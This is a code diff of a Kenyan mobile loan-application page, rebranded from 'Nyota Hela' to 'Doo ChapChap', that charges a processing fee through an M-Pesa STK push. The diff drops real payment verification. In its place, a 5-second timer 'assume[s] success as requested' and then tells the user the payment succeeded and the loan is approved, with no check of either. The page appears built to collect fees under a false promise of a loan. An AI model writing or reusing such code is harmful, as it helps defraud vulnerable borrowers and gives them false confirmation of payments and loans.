@@ -4,17 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apply for Loan | Nyota Hela</title>
+    <title>Apply for Loan | Doo ChapChap</title>
     
-    <!-- Favicons -->
     <link rel="apple-touch-icon" sizes="192x192" href="icons/icon.192.png">
     <link rel="icon" type="image/png" sizes="512x512" href="icons/icon.512.png">
     
-    <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- SweetAlert -->
     <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
     
     <style>
@@ -694,159 +691,226 @@ body {
         </a>
     </div>
 
-    <!-- SweetAlert JS -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
-
+    
     <script>
-        // 1. DEFINE VARIABLES GLOBALLY
-        let selectedLoan = null;
-        
-        // 2. CONFIGURATION
+        // Updated Endpoint for Local PHP
         const API_ENDPOINTS = {
-            initiatePayment: 'api/initiate-payment.php',
-            verifyPayment: 'api/verify-payment.php',
-            normalizePhone: 'api/normalize-phone.php'
+            initiatePayment: 'stk_initiate.php'
         };
 
-        // 3. THE SELECTION FUNCTION (MUST BE GLOBAL)
-        // This function is called immediately when you tap a card
-        window.selectLoan = function(element, amount, fee) {
-            console.log("Card Clicked: ", amount); // Debugging check
+        // Direct Daraja STK Push via PHP
+        async function initiateDarajaPush(phoneNumber, amount) {
+            try {
+                const response = await fetch(API_ENDPOINTS.initiatePayment, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                        amount: amount
+                    })
+                });
 
-            // A. Remove 'selected' class from all cards
-            document.querySelectorAll('.loan-card').forEach(card => {
-                card.classList.remove('selected');
-            });
+                const result = await response.json();
 
-            // B. Add 'selected' class to the clicked card
-            element.classList.add('selected');
-
-            // C. Save the selection data
-            selectedLoan = { amount: amount, fee: fee };
-
-            // D. Enable the button
-            const btn = document.getElementById('apply-btn');
-            btn.disabled = false;
-            btn.classList.add('active');
-            btn.innerText = "Get Loan Now";
+                // Daraja returns ResponseCode "0" for successful initiation
+                if (result.ResponseCode === "0") {
+                    return result;
+                } else {
+                    throw new Error(result.ResponseDescription || 'Payment initiation failed');
+                }
+            } catch (error) {
+                console.error('Payment API Error:', error);
+                throw error;
+            }
         }
 
-        // 4. API FUNCTIONS
-        async function normalizePhoneNumber(phone) {
-            const response = await fetch(API_ENDPOINTS.normalizePhone, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone })
-            });
-            const result = await response.json();
-            if (!result.normalized_phone) throw new Error("Invalid phone number");
-            return result.normalized_phone;
+        // Simple phone normalizer for JS display
+        function formatPhoneForDisplay(phone) {
+            // Assumes format 07xx or 2547xx
+            let p = phone.toString();
+            if (p.startsWith('0')) return p;
+            if (p.startsWith('254')) return '0' + p.substring(3);
+            return p;
         }
 
-        async function initiateDarajaSTK(phoneNumber, amount, loanAmount) {
-            const response = await fetch(API_ENDPOINTS.initiatePayment, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone_number: phoneNumber, amount: amount, loan_amount: loanAmount })
-            });
-            const result = await response.json();
-            if (!result.success) throw new Error(result.error || 'Connection failed');
-            return result;
+        // Load user data
+        const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
+        if (!userData.phone_number) {
+            // Fallback for testing if session empty
+            userData.phone_number = "0700000000";
+            userData.name = "Customer";
+            // In production: window.location.href = 'eligibility.html';
         }
 
-        async function checkPaymentStatus(reference) {
-            let attempts = 0;
-            return new Promise((resolve, reject) => {
-                const interval = setInterval(async () => {
-                    attempts++;
-                    try {
-                        const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${reference}`);
-                        const result = await response.json();
-                        
-                        if (result.success && result.status === 'COMPLETED') {
-                            clearInterval(interval);
-                            resolve(true);
-                        } else if (result.success && result.status === 'FAILED') {
-                            clearInterval(interval);
-                            reject(new Error('Payment Failed'));
-                        } else if (attempts >= 20) {
-                            clearInterval(interval);
-                            reject(new Error('Timeout'));
-                        }
-                    } catch (e) {} // Ignore network errors
-                }, 3000);
-            });
-        }
+        document.getElementById('user-name').textContent = userData.name || 'Customer';
 
-        // 5. BUTTON CLICK LISTENER
-        document.getElementById('apply-btn').addEventListener('click', async function() {
+        let selectedLoan = null;
+
+        function selectLoanOption(element, amount, fee) {
+            // Remove selection from all options
+            document.querySelectorAll('.loan-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
             
-            // A. Validation
+            // Add selection to clicked option
+            element.classList.add('selected');
+            
+            // Store selected loan
+            selectedLoan = { amount, fee };
+            
+            // Enable apply button
+            document.getElementById('apply-btn').disabled = false;
+            document.getElementById('error-message').style.display = 'none';
+            
+            // Update session data
+            userData.loan_amount = amount;
+            userData.processing_fee = fee;
+            sessionStorage.setItem('myLoan', JSON.stringify(userData));
+        }
+
+        document.getElementById('apply-btn').addEventListener('click', async function() {
             if (!selectedLoan) {
-                Swal.fire('Oops', 'Please select a loan limit.', 'warning');
+                document.getElementById('error-message').style.display = 'block';
                 return;
             }
 
-            const name = document.getElementById('full-name').value;
-            const phone = document.getElementById('phone-number').value;
-
-            if (!name || !phone) {
-                Swal.fire('Missing Info', 'Please fill in Name and Phone Number.', 'warning');
-                return;
-            }
-
-            // B. Show Confirmation Popup
+            // Show mobile-optimized confirmation modal
             const { value: confirmed } = await Swal.fire({
-                title: '<div class="mobile-confirm-header"><div class="mobile-confirm-title">Confirm Loan</div></div>',
+                title: '<div class="mobile-confirm-header">' +
+                        '<div class="mobile-confirm-icon"><i class="fas fa-check-circle"></i></div>' +
+                        '<div class="mobile-confirm-title">Confirm Loan</div>' +
+                        '<div class="mobile-confirm-subtitle">Review details before payment</div>' +
+                        '</div>',
                 html: `
-                    <div class="mobile-confirm-body">
-                        <div class="mobile-summary-item"><span>Applicant:</span> <b>${name}</b></div>
-                        <div class="mobile-summary-item"><span>Loan Limit:</span> <b>Ksh ${selectedLoan.amount}</b></div>
-                        <div class="mobile-summary-item"><span>Fee:</span> <b style="color:red">Ksh ${selectedLoan.fee}</b></div>
-                        <div class="mobile-phone-display"><i class="fas fa-mobile-alt"></i> ${phone}</div>
-                    </div>
-                    <div class="mobile-confirm-footer">
-                        <button class="mobile-confirm-btn" onclick="Swal.clickConfirm()">Pay Ksh ${selectedLoan.fee} & Apply</button>
-                        <button class="mobile-cancel-btn" onclick="Swal.close()">Cancel</button>
+                    <div class="mobile-confirm-modal">
+                        <div class="mobile-confirm-body">
+                            <div class="mobile-loan-summary">
+                                <div class="mobile-summary-item">
+                                    <span class="mobile-summary-label">Loan Amount:</span>
+                                    <span class="mobile-summary-value">Ksh ${selectedLoan.amount.toLocaleString()}</span>
+                                </div>
+                                <div class="mobile-summary-item">
+                                    <span class="mobile-summary-label">Processing Fee:</span>
+                                    <span class="mobile-summary-value">Ksh ${selectedLoan.fee}</span>
+                                </div>
+                                <div class="mobile-summary-item">
+                                    <span class="mobile-summary-label">Total Repayment:</span>
+                                    <span class="mobile-summary-value">Ksh ${(selectedLoan.amount * 1.1).toLocaleString()}</span>
+                                </div>
+                            </div>
+                            
+                            <div class="mobile-phone-display">
+                                <i class="fas fa-mobile-alt"></i> ${userData.phone_number}
+                            </div>
+                        </div>
+                        
+                        <div class="mobile-confirm-footer">
+                            <div class="mobile-confirm-buttons">
+                                <button class="mobile-confirm-btn" onclick="Swal.clickConfirm()">
+                                    <i class="fas fa-check-circle"></i> Pay Ksh ${selectedLoan.fee}
+                                </button>
+                                <button class="mobile-cancel-btn" onclick="Swal.close()">
+                                    <i class="fas fa-times"></i> Cancel
+                                </button>
+                            </div>
+                        </div>
                     </div>
                 `,
                 showConfirmButton: false,
-                customClass: { popup: 'mobile-confirm-modal' }
+                showCancelButton: false,
+                customClass: {
+                    popup: 'mobile-confirm-modal'
+                }
             });
 
             if (confirmed) {
-                // C. Loading
-                Swal.fire({ title: 'Processing...', didOpen: () => Swal.showLoading() });
+                Swal.fire({
+                    title: 'Initiating Payment',
+                    html: 'Please wait...',
+                    allowOutsideClick: false,
+                    didOpen: () => Swal.showLoading(),
+                    customClass: {
+                        popup: 'swal2-center'
+                    }
+                });
 
                 try {
-                    const normalizedPhone = await normalizePhoneNumber(phone);
-                    const res = await initiateDarajaSTK(normalizedPhone, selectedLoan.fee, selectedLoan.amount);
+                    // Send STK Push
+                    const paymentResponse = await initiateDarajaPush(
+                        userData.phone_number,
+                        selectedLoan.fee
+                    );
 
-                    if (res.reference) {
-                        // D. Instructions Popup
-                        Swal.fire({
-                            title: 'Check Your Phone',
-                            text: `Enter PIN for Ksh ${selectedLoan.fee}`,
-                            icon: 'info',
-                            showConfirmButton: false,
-                            allowOutsideClick: false
-                        });
+                    // Show mobile-optimized STK push modal (Instructional)
+                    Swal.fire({
+                        title: '<div class="mobile-stk-header">Payment Request Sent</div>',
+                        html: `
+                            <div class="mobile-stk-modal">
+                                <div class="mobile-stk-body">
+                                    <i class="fas fa-mobile-alt mobile-stk-icon" style="color:#4361ee"></i>
+                                    <h3>Check Your Phone</h3>
+                                    <p>Enter your M-Pesa PIN to complete the payment</p>
+                                    <div class="mobile-stk-amount">Ksh ${selectedLoan.fee}</div>
+                                    <div class="mobile-stk-phone">${userData.phone_number}</div>
+                                </div>
+                                <div class="mobile-stk-footer">
+                                    <p>Processing...</p>
+                                </div>
+                            </div>
+                        `,
+                        showConfirmButton: false,
+                        allowOutsideClick: false,
+                        customClass: {
+                            popup: 'mobile-stk-modal'
+                        }
+                    });
 
-                        // E. Wait for Payment
-                        await checkPaymentStatus(res.reference);
-
-                        // F. Success
+                    // Simulate waiting for user to enter PIN (5 seconds), then assume success as requested
+                    setTimeout(async () => {
                         await Swal.fire({
+                            title: 'Payment Successful!',
+                            html: `
+                                <div style="text-align:center;">
+                                    <i class="fas fa-check-circle" style="font-size: 52px; color: #4caf50; margin-bottom: 14px;"></i>
+                                    <p style="font-size: 1rem;">Your loan of <strong>Ksh ${selectedLoan.amount.toLocaleString()}</strong> has been approved!</p>
+                                    <p style="color: #666; font-size: 0.85rem; margin-top: 10px;">Disbursing funds...</p>
+                                </div>
+                            `,
                             icon: 'success',
-                            title: 'Loan Approved!',
-                            text: 'Funds are being processed.',
                             timer: 3000,
-                            showConfirmButton: false
+                            showConfirmButton: false,
+                            customClass: {
+                                popup: 'swal2-center'
+                            }
                         });
+
+                        sessionStorage.setItem('loanApproved', JSON.stringify({
+                            ...userData,
+                            ...selectedLoan,
+                            approvedAt: new Date().toISOString()
+                        }));
+
+                        // Redirect to dashboard
                         window.location.href = 'dash.html';
-                    }
+                    }, 5000); // 5 Second delay
+
                 } catch (error) {
-                    Swal.fire('Error', error.message, 'error');
+                    console.error('Payment error:', error);
+                    Swal.fire({
+                        title: 'Request Failed',
+                        html: `
+                            <p style="font-size: 0.9rem;">${error.message || 'Unable to push M-Pesa prompt.'}</p>
+                        `,
+                        icon: 'error',
+                        confirmButtonText: 'Try Again',
+                        confirmButtonColor: '#4361ee',
+                        customClass: {
+                            popup: 'swal2-center'
+                        }
+                    });
                 }
             }
         });
